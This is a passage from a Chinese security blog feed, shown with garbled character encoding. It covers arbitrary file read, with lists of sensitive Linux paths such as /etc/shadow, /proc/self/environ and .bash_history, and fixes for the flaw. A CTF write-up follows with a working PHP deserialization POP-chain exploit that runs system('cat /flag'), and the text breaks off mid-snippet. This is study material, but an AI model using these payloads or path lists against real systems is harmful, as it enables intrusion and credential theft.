â“¨ â“© </span><br><span class="line">â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ </span><br><span class="line">â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿</span><br></pre></td></tr></table></figure><h4 id="xip-io"><a href="#xip-io" class="headerlink" title="xip.io"></a>xip.io</h4><p><img src="/../images/image-20230603222133775.png" alt="image-20230603222133775"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>![å±å¹•æˆªå›¾ 2023-03-22 101713](..&#x2F;images&#x2F;å±å¹•æˆªå›¾ 2023-03-22 101713.png)</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.wangan.com/articles/1238#59315b">https://www.wangan.com/articles/1238#59315b</a></p><p><a href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a></p><p><a href="https://joychou.org/web/phpssrf.html#directory0811578052187574410">https://joychou.org/web/phpssrf.html#directory0811578052187574410</a></p><p><a href="https://www.sqlsec.com/2021/05/ssrf.html">https://www.sqlsec.com/2021/05/ssrf.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä»»æ„æ–‡ä»¶è¯»å–å’Œä¸‹è½½</title>
      <link href="/2023/05/31/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E4%B8%8B%E8%BD%BD/"/>
      <url>/2023/05/31/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h1><p>ä¸€äº›ç½‘ç«™ç”±äºä¸šåŠ¡éœ€è¦ï¼Œå¯èƒ½æä¾›æ–‡ä»¶æŸ¥çœ‹æˆ–ä¸‹è½½çš„åŠŸèƒ½ï¼Œå¦‚æœå¯¹ç”¨æˆ·æŸ¥çœ‹æˆ–ä¸‹è½½çš„æ–‡ä»¶ä¸åšé™åˆ¶ï¼Œæ”»å‡»è€…å°±èƒ½å¤Ÿé€šè¿‡å›æº¯ç¬¦<code>../</code>æˆ–<code>ç»å¯¹è·¯å¾„</code>è·³è½¬åˆ°ä»»æ„ç›®å½•æŸ¥çœ‹æˆ–ä¸‹è½½ä»»æ„çš„æ–‡ä»¶ï¼›è¿™å¯èƒ½æ˜¯ä»£ç æºæ–‡ä»¶ï¼Œæ•æ„Ÿé…ç½®æ–‡ä»¶ç­‰ç­‰ï¼Œåœ¨ç‰¹å®šçš„åœºæ™¯ä¸‹ï¼Œè¿˜å¯èƒ½é€ æˆSSRFæ¼æ´ã€‚</p><h1 id="å¸¸è§åœºæ™¯"><a href="#å¸¸è§åœºæ™¯" class="headerlink" title="å¸¸è§åœºæ™¯"></a>å¸¸è§åœºæ™¯</h1><p><img src="/../images/qcLDlsYeCB1V6EK.png" alt="image-20220112103936559"></p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>è¯»å–</p><ul><li>ç½‘ç«™æºç </li><li>é…ç½®æ–‡ä»¶</li></ul><table><thead><tr><th align="center">ä¸­é—´ä»¶</th><th align="center">é…ç½® æ–‡ä»¶ç›®å½•</th><th align="center">ä¸»é…ç½®æ–‡ä»¶</th><th align="center">ç½‘ç«™ç›®å½•</th><th align="center">æ—¥å¿—ç›®å½•</th></tr></thead><tbody><tr><td align="center">nginx</td><td align="center">&#x2F;etc&#x2F;nginx&#x2F;</td><td align="center">nginx.conf</td><td align="center">&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;</td><td align="center">&#x2F;var&#x2F;log&#x2F;nginx&#x2F;</td></tr><tr><td align="center">apache</td><td align="center">&#x2F;etc&#x2F;apache2&#x2F;</td><td align="center">apache2.conf</td><td align="center">&#x2F;var&#x2F;www&#x2F;html&#x2F;</td><td align="center">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;</td></tr><tr><td align="center">tomcat</td><td align="center">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;conf</td><td align="center">å¦‚ä¸‹å›¾</td><td align="center">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps</td><td align="center">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;log</td></tr></tbody></table><p><img src="/../images/image-20230301144917539-1686983536199.png" alt="image-20230301144917539"></p><ul><li><p>javaç«™ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/WEB-INF/web.xml</span><br><span class="line">/WEB-INF/classes/applicationContext.xml</span><br><span class="line">/WEB-INF/classes/xxx/xxx/xxx.class</span><br><span class="line">core.jar</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœé‡åˆ°Shiroç«™ç‚¹ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨å…¨è·¯å¾„æ‰¾åˆ°core.jarï¼Œå»ä¸‹è½½core.jarï¼Œä¸‹è½½ååç¼–è¯‘æœç´¢<code>Base64.decode</code>ç›´æ¥æ‰¾keyï¼Œè¿›è€Œgetshell</p></blockquote></li><li><p>tomcat</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/tomcat/conf/tomcat-users.xml</span><br></pre></td></tr></table></figure></li><li><p>nginx</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/www/nginx/conf/nginx.conf</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/local/nginx/conf/nginx.conf</span><br><span class="line">/usr/local/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure></li><li><p>apache</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/apache2/apache2.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br></pre></td></tr></table></figure></li><li><p>redis<br><code>/etc/redis.conf</code></p></li><li><p>ssh<br><code>/etc/ssh/sshd_config</code></p></li></ul><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="x2F-etc-ç³»ç»Ÿé…ç½®æ–‡ä»¶ç›®å½•"><a href="#x2F-etc-ç³»ç»Ÿé…ç½®æ–‡ä»¶ç›®å½•" class="headerlink" title="&#x2F;etc ç³»ç»Ÿé…ç½®æ–‡ä»¶ç›®å½•"></a><strong>&#x2F;etc ç³»ç»Ÿé…ç½®æ–‡ä»¶ç›®å½•</strong></h4><ul><li><p>&#x2F;etc&#x2F;passwd</p><p>è®°å½•ç”¨æˆ·ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">tcpdump:x:72:72::/:/sbin/nologin</span><br><span class="line">....</span><br><span class="line">å…è®¸ç™»å…¥çš„shellå°±æ˜¯/bin/bashç¦æ­¢shellç™»å…¥å°±æ˜¯/sbin/nologin</span><br></pre></td></tr></table></figure><ul><li><p>æ ¼å¼è§£æ</p><p>ä»¥:ä½œä¸ºåˆ†éš”ç¬¦<br>ç™»å½•å:åŠ å¯†çš„å£ä»¤:UID:GID:ç”¨æˆ·ä¿¡æ¯:ç”¨æˆ·ç›®å½•:ç”¨æˆ·ç™»é™†åä½¿ç”¨çš„shell</p></li><li><p>ä¸ºä»€ä¹ˆæœ‰äº›ç™»å½•åæ˜¯æœåŠ¡è¿›ç¨‹åï¼Ÿ</p><blockquote><p>Linuxç³»ç»Ÿä¼šä¸ºå„ç§å„æ ·çš„åŠŸèƒ½åˆ›å»ºä¸åŒçš„ç”¨æˆ·è´¦æˆ·ï¼Œè€Œè¿™äº›è´¦æˆ·å¹¶ä¸æ˜¯çœŸçš„ç”¨æˆ·ã€‚</p><p>è¿™äº›è´¦æˆ·å«ä½œç³»ç»Ÿè´¦æˆ·ï¼Œæ˜¯ç³»ç»Ÿä¸Šè¿è¡Œçš„å„ç§æœåŠ¡è¿›ç¨‹è®¿é—®èµ„æºç”¨çš„ç‰¹æ®Šè´¦æˆ·ã€‚</p><p>æ¯”å¦‚ä¸Šè¿°çš„ftpï¼Œtcpdumpã€‚</p></blockquote></li><li><p>ä¸ºä»€ä¹ˆè¦è¿™æ ·åšï¼Ÿ</p><blockquote><p>åœ¨å®‰å…¨æˆä¸ºä¸€ä¸ªå¤§é—®é¢˜ä¹‹å‰ï¼Œè¿™äº›æœåŠ¡ç»å¸¸ä¼šç”¨rootè´¦æˆ·ç™»å½•ã€‚é—æ†¾çš„æ˜¯ï¼Œå¦‚æœæœ‰éæˆæƒçš„ç”¨æˆ·æ”»é™·äº†è¿™äº›æœåŠ¡ä¸­çš„ä¸€ä¸ªï¼Œä»–ç«‹åˆ»å°±èƒ½ä½œä¸ºrootç”¨æˆ·è¿›å…¥ç³»ç»Ÿã€‚ä¸ºäº†é˜²æ­¢å‘ç”Ÿè¿™ç§æƒ…å†µï¼Œç°åœ¨è¿è¡Œåœ¨LinuxæœåŠ¡å™¨åå°çš„å‡ ä¹æ‰€æœ‰çš„æœåŠ¡éƒ½æ˜¯ç”¨è‡ªå·±çš„è´¦æˆ·ç™»å½•ã€‚è¿™æ ·çš„è¯ï¼Œå³ä½¿æœ‰äººæ”»å…¥äº†æŸä¸ªæœåŠ¡ï¼Œä¹Ÿæ— æ³•è®¿é—®æ•´ä¸ªç³»ç»Ÿã€‚</p></blockquote></li><li><p>ä¸ºä»€ä¹ˆå¯†ç éƒ½æ˜¯X</p><blockquote><p>é‰´äºå¾ˆå¤šç¨‹åºéƒ½éœ€è¦è®¿é—®etc&#x2F;passwdæ–‡ä»¶è·å–ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™å°±æˆäº†ä¸€ä¸ªå®‰å…¨éšæ‚£ã€‚</p><p>ç»å¤§å¤šæ•°Linuxç³»ç»Ÿéƒ½å°†ç”¨æˆ·å¯†ç ä¿å­˜åœ¨å¦ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ä¸­ï¼ˆå«ä½œshadowæ–‡ä»¶ï¼Œä½ç½®</p><p>åœ¨&#x2F;etc&#x2F;shadowï¼‰ã€‚åªæœ‰ç‰¹å®šçš„ç¨‹åºï¼ˆæ¯”å¦‚ç™»å½•ç¨‹åºï¼‰æ‰èƒ½è®¿é—®è¿™ä¸ªæ–‡ä»¶</p></blockquote></li></ul></li><li><p>&#x2F;etc&#x2F;shadow</p><blockquote><p>&#x2F;etc&#x2F;shadowæ–‡ä»¶å¯¹Linuxç³»ç»Ÿå¯†ç ç®¡ç†æä¾›äº†æ›´å¤šçš„æ§åˆ¶ã€‚åªæœ‰rootç”¨æˆ·æ‰èƒ½è®¿é—®&#x2F;etc&#x2F;shadow</p><p>æ–‡ä»¶ï¼Œè¿™è®©å®ƒæ¯”èµ·&#x2F;etc&#x2F;passwdå®‰å…¨è®¸å¤šã€‚</p></blockquote></li><li><p>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p><p>macåœ°å€</p></li></ul><h4 id="å†…ç½‘æ¢æµ‹"><a href="#å†…ç½‘æ¢æµ‹" class="headerlink" title="å†…ç½‘æ¢æµ‹"></a>å†…ç½‘æ¢æµ‹</h4><p>æ–‡ä»¶å†…å®¹è§£é‡Š<a href="https://blog.csdn.net/weichanghu_/article/details/80073959">https://blog.csdn.net/weichanghu_/article/details/80073959</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/hostsï¼šè®°å½•æœ¬æœºçš„æˆ–å…¶ä»–ä¸»æœºçš„ipåŠå…¶å¯¹åº”ä¸»æœºå</span><br><span class="line">/proc/net/arpï¼šè®°å½•ä¸»æœºipå’Œmacï¼Ÿï¼ˆarpåè®®ï¼‰</span><br><span class="line">/proc/net/tcp</span><br><span class="line">/proc/net/udp</span><br><span class="line">/proc/net/dev</span><br><span class="line">/proc/net/fib_trie</span><br></pre></td></tr></table></figure><h4 id="å‘½ä»¤å†å²æ“ä½œ"><a href="#å‘½ä»¤å†å²æ“ä½œ" class="headerlink" title="å‘½ä»¤å†å²æ“ä½œ"></a>å‘½ä»¤å†å²æ“ä½œ</h4><p><a href="https://blog.csdn.net/u011479200/article/details/86501366">Linux| ç”¨æˆ·ç›®å½•ä¸‹ä¸‰ä¸ªbashæ–‡ä»¶çš„ä½œç”¨(.bash_history,.bash_logout,.bash_profile,.bashrc)_YvesHeçš„åšå®¢-CSDNåšå®¢_bash_history</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home/ç”¨æˆ·å/.bash_historyï¼š ä¿å­˜äº†å½“å‰ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤</span><br></pre></td></tr></table></figure><blockquote><p>å‘½ä»¤å†å²è®°å½•è¢«ä¿å­˜åœ¨éšè—æ–‡ä»¶.bash_historyä¸­ï¼Œå®ƒä½äºç”¨æˆ·çš„ä¸»ç›®å½•ä¸­ã€‚</p><p>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œbashå‘½ä»¤çš„å†å²è®°å½•æ˜¯å…ˆå­˜æ”¾åœ¨å†…å­˜ä¸­ï¼Œå½“shellé€€å‡ºæ—¶æ‰è¢«å†™å…¥åˆ°å†å²æ–‡ä»¶ä¸­ã€‚</p></blockquote><p>rootç”¨æˆ·å¯ä»¥é€šè¿‡<code>history</code>å‘½ä»¤æŸ¥çœ‹</p><p><img src="/../images/image-20220923180951946-1686983536198.png" alt="image-20220923180951946"></p><h4 id="x2F-procç›®å½•"><a href="#x2F-procç›®å½•" class="headerlink" title="&#x2F;procç›®å½•"></a>&#x2F;procç›®å½•</h4><blockquote><p>&#x2F;proc æ˜¯ä¸€ç§ä¼ªæ–‡ä»¶ç³»ç»Ÿï¼ˆä¹Ÿå³è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œå­˜å‚¨çš„æ˜¯å½“å‰å†…æ ¸è¿è¡ŒçŠ¶æ€çš„ä¸€ç³»åˆ—ç‰¹æ®Šæ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¿™äº›æ–‡ä»¶æŸ¥çœ‹æœ‰å…³ç³»ç»Ÿç¡¬ä»¶åŠå½“å‰æ­£åœ¨è¿è¡Œè¿›ç¨‹çš„ä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥é€šè¿‡æ›´æ”¹å…¶ä¸­æŸäº›æ–‡ä»¶æ¥æ”¹å˜å†…æ ¸çš„è¿è¡ŒçŠ¶æ€ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/proc/self/cmdline</span><br><span class="line">/proc/self/cwd</span><br><span class="line">/proc/self/exe</span><br><span class="line">/proc/self/environ</span><br><span class="line">/proc/self/mounts</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">çˆ†ç ´</span></span><br><span class="line">/proc/pid/fd</span><br><span class="line">/proc/?/fd  # ä½¿ç”¨é€šé…ç¬¦åŒ¹é…</span><br></pre></td></tr></table></figure><h5 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h5><blockquote><ol><li><strong>åœ¨ linux ç³»ç»Ÿä¸­å¦‚æœä¸€ä¸ªç¨‹åºç”¨open()æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ä½†æœ€ç»ˆæ²¡æœ‰å…³é—­ä»–ï¼Œå³ä¾¿ä»å¤–éƒ¨ï¼ˆå¦‚os.remove(SECRET_FILE)ï¼‰åˆ é™¤è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œåœ¨ &#x2F;proc è¿™ä¸ªè¿›ç¨‹çš„ pid ç›®å½•ä¸‹çš„ fd æ–‡ä»¶æè¿°ç¬¦ç›®å½•ä¸‹è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æˆ‘ä»¬å³å¯å¾—åˆ°è¢«åˆ é™¤æ–‡ä»¶çš„å†…å®¹ã€‚</strong></li><li><strong><code>/proc/self</code>åœ¨ä½¿ç”¨æ—¶ï¼Œæˆ‘ä»¬æ˜¯ä¸èƒ½é€šè¿‡å‘½ä»¤çš„æ–¹å¼æ‰§è¡Œé€šè¿‡catå‘½ä»¤è¯»å–cmdlineçš„ï¼Œå› ä¸ºå¦‚æœæ˜¯catè¯»å–&#x2F;proc&#x2F;self&#x2F;cmdlineçš„è¯ï¼Œå¾—åˆ°çš„æ˜¯catè¿›ç¨‹çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡é¢˜ç›®çš„å½“å‰è¿›ç¨‹ä½¿ç”¨è¯»å–æ–‡ä»¶ï¼ˆå¦‚æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæˆ–è€…SSTIä½¿ç”¨fileæ¨¡å—è¯»å–æ–‡ä»¶ï¼‰çš„æ–¹å¼è¯»å–&#x2F;proc&#x2F;self&#x2F;cmdlineã€‚</strong></li></ol></blockquote><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><ol><li>åœ¨é…ç½®æ–‡ä»¶ä¸­é™åˆ¶è®¿é—®çš„æ–‡ä»¶ç›®å½•</li><li>æ£€æŸ¥ç”¨æˆ·è¾“å…¥ï¼Œè¿‡æ»¤æˆ–è½¬ä¹‰å«æœ‰<code>../</code>ã€<code>..\</code>ã€<code>%00</code>ï¼Œ<code>..</code>ï¼Œ<code>./</code>ï¼Œ<code>#</code>ç­‰è·³è½¬ç›®å½•æˆ–å­—ç¬¦ç»ˆæ­¢ç¬¦ã€æˆªæ–­å­—ç¬¦çš„è¾“å…¥</li><li>ä¸¥æ ¼è¿‡æ»¤ç”¨æˆ·è¾“å…¥å­—ç¬¦çš„åˆæ³•æ€§ï¼Œæ¯”å¦‚æ–‡ä»¶ç±»å‹ã€æ–‡ä»¶åœ°å€ã€æ–‡ä»¶å†…å®¹ç­‰</li><li>ç™½åå•é™å®šè®¿é—®æ–‡ä»¶çš„ç›®å½•ã€è·¯å¾„ã€åç§°</li><li>ç™½åå•é™å®šè®¿é—®æ–‡ä»¶çš„åç¼€å¦‚jpgã€gifã€pngã€rarã€zipã€pdfã€docã€xlsã€pptç­‰</li></ol>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUU</title>
      <link href="/2023/05/31/BUU/"/>
      <url>/2023/05/31/BUU/</url>
      
        <content type="html"><![CDATA[<h1 id="2022-10æœˆèµ›"><a href="#2022-10æœˆèµ›" class="headerlink" title="2022.10æœˆèµ›"></a>2022.10æœˆèµ›</h1><h2 id="EasyPOP"><a href="#EasyPOP" class="headerlink" title="EasyPOP"></a>EasyPOP</h2><p>popé“¾</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sorry::_destruct() ---&gt;  show::_tostring()  ---&gt;  secret_code::call ---&gt;  secret_code::show() ---&gt;  sorry::_get() </span><br><span class="line">---&gt;  fine::__invoke()</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘invoke&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;cmd:<span class="subst">$this</span>-&gt;cmd,content:<span class="subst">$this</span>-&gt;content&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘wakeup&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘tostring&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘get&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘destruct&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password == <span class="variable language_">$this</span>-&gt;name) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hint;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;jay&quot;</span>) &#123;</span><br><span class="line">            secret_code::<span class="title function_ invoke__">secret</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is our code&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘call&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘show&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sor</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$secret</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line"><span class="variable">$sor1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$fine</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fine</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$sor</span>-&gt;hint = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;ctf = <span class="variable">$secret</span>;</span><br><span class="line"><span class="variable">$secret</span>-&gt;code = <span class="variable">$sor1</span>;</span><br><span class="line"><span class="variable">$sor1</span>-&gt;key = <span class="variable">$fine</span>;</span><br><span class="line"><span class="variable">$fine</span>-&gt;cmd = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$fine</span>-&gt;content = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$sor</span>);<span class="comment">#æ›´æ”¹fineå±æ€§ç»•è¿‡wakeup</span></span><br><span class="line"><span class="variable">$a</span> =<span class="title function_ invoke__">serialize</span>(<span class="variable">$sor</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="hade-waiboâ€“å¤ç°"><a href="#hade-waiboâ€“å¤ç°" class="headerlink" title="hade_waiboâ€“å¤ç°"></a>hade_waiboâ€“å¤ç°</h2><p>cancanneed å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</p><p>è·å¾—index.php,file.php,class.phpæºç </p><p>å®¡è®¡class.phpçš„å†…å®¹ï¼Œå¾ˆå®¹æ˜“å¯ä»¥çŸ¥é“è¿™æ˜¯pharååºåˆ—åŒ–+RCEã€‚</p><p>éœ€è¦ç»•è¿‡wakeupå’Œæ­£åˆ™ã€‚</p><p>wakeupæ˜¯æƒ³ç”¨å¸¸è§„çš„å±æ€§ä¸ªæ•°ç»•è¿‡ï¼Œä½†æ˜¯ä¸è¡Œï¼Œç„¶åæ­£åˆ™æƒ³ä¸å‡ºæ¥ã€‚ã€‚</p><hr><p>ç„¶åçœ‹äº†å¤§ä½¬ä»¬çš„wpåçŸ¥é“ï¼Œåœ¨è¿™é“é¢˜çš„phpç‰ˆæœ¬ä¸‹<code>ç”¨å¸¸è§„çš„å±æ€§ä¸ªæ•°ç»•è¿‡</code>æ˜¯æ— æ•ˆçš„ã€‚</p><p>æœ‰ä¸¤ä¸ªæ€è·¯</p><ol><li><p>å¸ˆå‚…åšå®¢ï¼š<a href="https://blog.csdn.net/trytowritecode/article/details/127513176">https://blog.csdn.net/trytowritecode/article/details/127513176</a></p><blockquote><p>æ€»ç»“ï¼š</p><p>å…ˆä¸Šä¼ ä¸€ä¸ªå†…å®¹ä¸º</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh  